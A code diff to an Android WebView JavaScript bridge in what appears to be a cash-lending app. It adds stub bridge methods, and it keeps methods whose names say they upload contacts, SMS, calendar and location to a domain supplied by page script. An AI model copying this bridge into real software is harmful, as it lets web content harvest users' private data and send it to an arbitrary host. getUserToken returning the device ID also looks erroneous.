@@ -11,6 +11,9 @@ import android.webkit.WebView;
 import android.widget.Toast;
 import com.alibaba.fastjson.JSONObject;
 import com.cashhub.cash.common.UploadData;
+import com.cashhub.cash.common.utils.CommonUtil;
+import com.cashhub.cash.common.utils.DeviceUtils;
+import com.cashhub.cash.common.utils.StatusBarUtils;
 import com.tencent.sonic.sdk.SonicDiffDataCallback;
 
 
@@ -43,6 +46,62 @@ public class SonicJavaScriptInterface {
     this.mIntent = intent;
   }
 
+  /**
+   * 打开相机
+   */
+  @JavascriptInterface
+  public void openCamera() {
+  }
+
+  /**
+   * 打开图库
+   */
+  @JavascriptInterface
+  public void openGallery() {
+  }
+
+  /**
+   * 获取用户Token
+   */
+  @JavascriptInterface
+  public String getUserToken() {
+    return DeviceUtils.getDeviceId(mContext);
+  }
+
+  /**
+   * 获取设备号
+   */
+  @JavascriptInterface
+  public String getDeviceId() {
+    return DeviceUtils.getDeviceId(mContext);
+  }
+
+  /**
+   * 获取状态栏高度
+   */
+  @JavascriptInterface
+  public int getStatusBarHeight() {
+    return CommonUtil.getStatusBarHeight(mContext);
+  }
+
+  /**
+   * 获取标题栏高度
+   */
+  @JavascriptInterface
+  public int getTitleBarHeight() {
+    return CommonUtil.getTitleBarHeight(mContext);
+  }
+
+  /**
+   * 数据上报/埋点功能调用
+   */
+  @JavascriptInterface
+  public void reportInfo() {
+  }
+
+  /**
+   * 上报设备信息
+   */
   @JavascriptInterface
   public void getAndSendDevice(JSONObject systemInfo, String token, String domain,
     long timeStamp, String deviceKey) {
@@ -62,11 +121,6 @@ public class SonicJavaScriptInterface {
 
   /**
    * 手机上报通讯录
-   * @param systemInfo
-   * @param token
-   * @param domain
-   * @param timeStamp
-   * @param deviceKey
    */
   @JavascriptInterface
   public void getAndSendContact(JSONObject systemInfo, String token, String domain,
@@ -87,11 +141,6 @@ public class SonicJavaScriptInterface {
 
   /**
    * 手机上报短信信息
-   * @param systemInfo
-   * @param token
-   * @param domain
-   * @param timeStamp
-   * @param deviceKey
    */
   @JavascriptInterface
   public void getAndSendSms(JSONObject systemInfo, String token, String domain,
@@ -112,11 +161,6 @@ public class SonicJavaScriptInterface {
 
   /**
    * 手机上报日历
-   * @param systemInfo
-   * @param token
-   * @param domain
-   * @param timeStamp
-   * @param deviceKey
    */
   @JavascriptInterface
   public void getAndSendCalendar(JSONObject systemInfo, String token, String domain,
@@ -137,11 +181,6 @@ public class SonicJavaScriptInterface {
 
   /**
    * 手机上报定位
-   * @param systemInfo
-   * @param token
-   * @param domain
-   * @param timeStamp
-   * @param deviceKey
    */
   @JavascriptInterface
   public void getAndSendMap(JSONObject systemInfo, String token, String domain,
@@ -162,11 +201,6 @@ public class SonicJavaScriptInterface {
 
   /**
    * 手机上报定位
-   * @param systemInfo
-   * @param token
-   * @param domain
-   * @param timeStamp
-   * @param deviceKey
    */
   @JavascriptInterface
   public void getAndSendLocation(JSONObject systemInfo, String token, String domain,
